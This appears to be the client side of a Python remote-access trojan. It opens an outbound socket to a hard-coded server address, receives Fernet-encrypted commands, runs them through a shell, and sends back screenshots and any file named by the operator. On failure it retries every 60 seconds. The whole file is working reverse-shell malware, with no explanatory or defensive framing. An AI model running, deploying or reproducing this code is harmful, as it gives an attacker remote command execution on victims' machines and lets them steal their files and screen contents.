import socket
import subprocess
import os
import sys
import time
from cryptography.fernet import Fernet
from PIL import ImageGrab
import struct
import pickle



def get_key():
    key = b'NOyZtZKjp5c40ivSuuJt2p-OynIpjpdbjEdViIVmWXY='
    return key


# Encrypt message:
# - read key and encrypt
def encrypt_mess(comm):
    'encode message'
    key = get_key()
    'use key to encrypt'
    f = Fernet(key)
    encrypted = f.encrypt(comm)
    return encrypted


# Decrypt data
def decrypt_mess(message):
    key = get_key()
    f = Fernet(key)
    decrypted_mess = f.decrypt(message)
    return decrypted_mess


# send images as data
def send_data(conn, data):
    serialized_data = pickle.dumps(data)
    conn.sendall(struct.pack('>I', len(serialized_data)))
    conn.sendall(serialized_data)


def run_command(command):
    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = proc.stdout.read() + proc.stderr.read()
    return output


def main():
    try:
        'initialise socket'
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # print("[+] Client on...")

        '#### server address ####'
        ip = '192.168.1.104'
        port = 6666

        'connect socket'
        s.connect((ip, port))
        # print("[+] Connected to server..")

        while True:
            try:
                data = s.recv(4096)
                print(data)
                decrypt = decrypt_mess(data)
                message = decrypt.decode()
                print(message)
                if "cd" in message:
                    newDir = message.replace('cd ', '')
                    try:
                        os.chdir(newDir)
                    except:
                        newDir = "Bad Input!"
                    dest = newDir.encode()
                    encrypted = encrypt_mess(dest)
                    s.send(encrypted)
                elif message == "screen_grab":
                    im = ImageGrab.grab()
                    send_data(s, im)
                    'continue to send bytes up to that size'
                elif "grab" in message:
                    file_name = message.replace("grab_", "")
                    print(file_name)
                    # check directory
                    cur_dir = os.getcwd()
                    location = cur_dir + "/" + file_name
                    print(location)
                    with open(file_name, "rb") as f:
                        file = f.read()
                    print(file)
                    send_data(s, file)
                elif data == '':
                    s.close()
                    sys.exit()
                else:
                    output = run_command(message)
                    enc_out = encrypt_mess(output)
                    s.send(enc_out)
            except:
                message = "bad input"
                enc_mess = encrypt_mess(message)
                s.send(enc_mess)
    except:
        time.sleep(60)
        main()


main()
